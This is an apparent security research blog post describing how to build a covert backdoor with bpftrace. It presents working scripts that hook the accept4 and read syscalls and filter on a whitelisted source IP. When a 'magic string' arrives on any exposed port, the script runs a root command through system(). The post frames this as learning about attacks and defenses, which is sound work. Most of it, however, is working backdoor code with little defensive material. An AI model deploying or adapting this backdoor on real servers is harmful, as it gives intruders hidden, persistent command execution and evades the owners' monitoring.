---
title: "Offensive Bpf: Using bpftrace to create more advanced backdoors"
date: 2021-10-10T11:30:13-07:00
draft: true
tags: [
        "pentest", "red","research","ebpf","blue"
    ]

twitter:
  card: "summary_large_image"
  site: "@wunderwuzzi23"
  creator: "@wunderwuzzi23"
  title: "Offensive BPF - Using bpftrace to create more advanced backdoors 🤯"
  description:  "Using eBPF in offensive security settings and mitigations"
  image: "https://embracethered.com/blog/images/2021/obpf.png"

---

This post is part of a series about **Offensive BPF** that I'm working on to learn about BPF to understand attacks and defenses, click the ["ebpf"](/blog/tags/ebpf) tag to see all relevant posts.

I'm learning BPF to understand how its use will impact offensive security, malware and detection engineering. 

![Offensive BPF](/blog/images/2021/offensive-bpf.png)

In the last post I described my learnings of building a rather basic bpftrace script that install a BPF backdoor program. This post will dive into this idea more by leveraging more complex 

Let's get going.

# Building a message-based trigger

What I really wanted is some kind of message-based trigger that runs when a "secret backdoor message" arrives on any port.

This is where I started learning a lot... 

I spent time reading Linux source code and how TCP parsing works with `struct msghdr *` and related data structures. It's all a bit convoluted. 

Searching through hook points with `bpftrace` identified a point of interest.

```
$ sudo bpftrace -lv 'tracepoint:*enter_read' 
BTF: using data from /sys/kernel/btf/vmlinux
tracepoint:syscalls:sys_enter_read
    int __syscall_nr;
    unsigned int fd;
    char * buf;
    size_t count;
```

About the command line options:

* `-l`:  lists all the tracepoints, kprobes, uprobes that match provided string
* `*`: Awesome: You can also use `*` as wildcards in the search
* `-v`: shows data structures details (very useful). This didn't work before upgrading to a very recent Ubuntu version

I wanted to read and print the `char * buf`. But when coding this, `sys_enter_read` gets called BUT that buffer is not yet filled with data - so how to access the data?

## Grasping "Enter" and "Exit" tracing to read buffers

It took me a bit to grasp how enter and exit tracepoints work in unison to achieve the desired result. 

In retrospect it seems obvious, but for anyone starting this explanation should help:

Exit tracepoints (e.g. `sys_exit_read`) don't have access to the arguments passed into the function. 

This puzzled me for a while... 

The way to handle this is to use the `sys_enter_read` hook **to store a pointer to the buffer in a thread local variable**. Then use the `sys_exit_read` hook **to read that pointer** again.

In the exit hook the buffer (in this case `buf`) is filled with the data. The `sys_exit_*` functions have a `ret` value that tells you about the length of the buffer to read.

After figuring that out, everything fell into place, and I made quick progress.

Here is what this means in `bpftrace` code:

```
tracepoint:syscalls:sys_enter_read
{ 
     @sys_read[tid] = args->buf;
}
```

This stores the `buf` pointer in `@variable[tid]`. In this case I named the varialble `@sys_read`.

Then in `sys_exit_read` the pointer is extracted, and we read the buffer as string.

```
tracepoint:syscalls:sys_exit_read
/ @sys_read[tid] /   
{ 
  $cmd = str(@sys_read[tid], args->ret);
  printf("<-sys_exit_read(tid:%d): len: %d, buf: %s\n", tid, args->ret, $cmd);
  
  if ($cmd == "OhhhBPF!\n")
  {   
    system("whoami >> /proc/1/root/tmp/o");
  }

  printf("<-sys_exit_read(tdi:%d): Done.\n", tid);
}
```

If the content of the buffer (now in variable `$cmd`) contains the word "`OhhhBPF!\n`" the program will run a simple `whoami` and store the result in a file. Notice the file path, using that namespace is another thing that took me quite a while to figure out.

### Applying a Filter

A new concept in this example is applying a `filter` by using `/ @sys_read[tid] /`. This filters only calls that are relevant. If you want to filter by a certain process name specify it like: `/ comm="nc" /`
 
But that's it. At this point the program works as intended!


## Improvements: Tracing only socket reads!

At that point reading buffers worked. It is noisy because all the `reads()` syscalls are traced, even though only socket connections are of interest.

There is probably a better way to do this, but with the newly acquired `bcptrace` chops, I thought to:

* Hook the socket `accept` call via the `syscalls:sys_enter_accept4` trace point. I learned about by the correct method to trace (`accept4`) by observing the systems calls of a `netcat` server, by running: `strace nc -lkv 20000` 
* Add an IP address allow check to only allow a specific IP to cause the trigger
* Store the file descriptor `fd` during `accept` in `@sys_accept[tid]` - so we keep track of which `fd` came from a socket
* Update the `sys_enter_read` to ensure the read's file descriptor matches the one we stored

This the resulting code:

```
#include <net/sock.h>

BEGIN
{
    printf("Welcome to Offensive BPF... Use Ctrl-C to exit.\n");
}

tracepoint:syscalls:sys_enter_accept4 
{ 
  printf("->accept: Comm: %s, Allowed IP: %u", comm, $1 );

  $sk4=(struct sockaddr_in  *) args->upeer_sockaddr; 
  if ($sk4->sin_family == AF_INET) 
  { 
    $ip4 = $sk4->sin_addr;
    if ($ip4 == 123456789) // whitelisted IP as integer
    {
      printf("->accept: *IPv4: fd:%d -- %s\n", args->fd, ntop($ip4) ); 
      @sys_accept[tid] = args->fd;  
    }
  } 
}

tracepoint:syscalls:sys_enter_read
{ 
  //only trace inet fd's
  if (args->fd == (uint64) @sys_accept[tid])
  {
     @sys_read[tid] = args->buf;
  }   
}

tracepoint:syscalls:sys_exit_read
/ @sys_read[tid] /   
{ 
  $cmd = str(@sys_read[tid], args->ret);
  printf("<-sys_exit_read(tid:%d): len: %d, buf: %s\n", tid, args->ret, $cmd);
  
  if ($cmd == "OhhhBPF: whoami\n")
  {   
    system("whoami >> /proc/1/root/tmp/o");
  }
 
  printf("<-sys_exit_read(tdi:%d): Done.\n", tid);
}

END
{
    clear(@sys_read);
    clear(@sys_accept);
    printf("Exiting. Bye.\n");
}
```

After these changes the program works well, and without noise!

## BPF Backdoor in Action

After launching the BPF program on the compromised server, connecting to any port that is exposed on the server, and sending the "magic string" will run the backdoor program!

Mind blown!